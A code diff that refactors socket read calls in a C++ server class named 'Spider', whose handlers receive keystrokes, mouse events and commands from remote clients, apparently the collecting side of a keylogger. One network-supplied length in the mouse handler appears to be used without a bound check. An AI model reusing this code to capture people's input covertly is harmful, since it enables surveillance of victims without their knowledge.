@@ -50,7 +50,7 @@ void			Spider::doFirstConnection()
 	dieInDignity();
       }
 
-j      if ((sizeName = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
+      if ((sizeName = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
 	std::cerr << "Wrong string size allowed" << std::endl;
 	dieInDignity();
       }
@@ -86,7 +86,7 @@ void			Spider::getTypeInfo(boost::asio::yield_context yield)
     uint8_t		id = 0;
 
     _buffer.reset();
-    if (_socket->async_read_ctx(_buffer.data(), 1, yield)) {
+    if (_socket->async_read(_buffer.data(), 1, yield)) {
       dieInDignity();
       return ;
     }
@@ -120,7 +120,7 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
   uint16_t		sizeText = 0;
   PaquetKeys		paquet;
 
-  if (_socket->async_read_ctx(_buffer.data(), 6, yield)) {
+  if (_socket->async_read(_buffer.data(), 6, yield)) {
     return ;
   }
   _buffer.reset();
@@ -131,7 +131,7 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
   }
 
   _buffer.reset();
-  if (_socket->async_read_ctx(_buffer.data(), sizeActive, yield)) {
+  if (_socket->async_read(_buffer.data(), sizeActive, yield)) {
     return ;
   }
 
@@ -142,7 +142,7 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
   }
 
   _buffer.reset();
-  if (_socket->async_read_ctx(_buffer.data(), 2, yield)) {
+  if (_socket->async_read(_buffer.data(), 2, yield)) {
     return ;
   }
   if ((sizeText = _buffer.getValue<uint16_t>()) >= SIZE_STRING) {
@@ -151,7 +151,7 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
   }
 
   _buffer.reset();
-  if (_socket->async_read_ctx(_buffer.data(), sizeText, yield)) {
+  if (_socket->async_read(_buffer.data(), sizeText, yield)) {
     return ;
   }
 
@@ -179,7 +179,7 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
   uint16_t		sizeActive = 0;
   PaquetMouse		paquet;
 
-  if (_socket->async_read_ctx(_buffer.data(), 6, yield)) {
+  if (_socket->async_read(_buffer.data(), 6, yield)) {
     return ;
   }
 
@@ -188,7 +188,7 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
   sizeActive = _buffer.getValue<uint16_t>();
 
   _buffer.reset();
-  if (_socket->async_read_ctx(_buffer.data(), sizeActive, yield)) {
+  if (_socket->async_read(_buffer.data(), sizeActive, yield)) {
     return ;
   }
 
@@ -197,7 +197,7 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
   paquet.setActive(_str);
 
   _buffer.reset();
-  if (_socket->async_read_ctx(_buffer.data(), 5, yield)) {
+  if (_socket->async_read(_buffer.data(), 5, yield)) {
     return ;
   }
 
@@ -224,7 +224,7 @@ void			Spider::getClientCMD(boost::asio::yield_context &yield)
   uint16_t		sizeData = 0;
   PaquetCommandClient	paquet;
 
-  if (_socket->async_read_ctx(_buffer.data(), 3, yield)) {
+  if (_socket->async_read(_buffer.data(), 3, yield)) {
     return ;
   }
 
@@ -233,7 +233,7 @@ void			Spider::getClientCMD(boost::asio::yield_context &yield)
   sizeData = _buffer.getValue<uint16_t>();
 
   _buffer.reset();
-  if (_socket->async_read_ctx(_buffer.data(), sizeData, yield)) {
+  if (_socket->async_read(_buffer.data(), sizeData, yield)) {
     return ;
   }
 
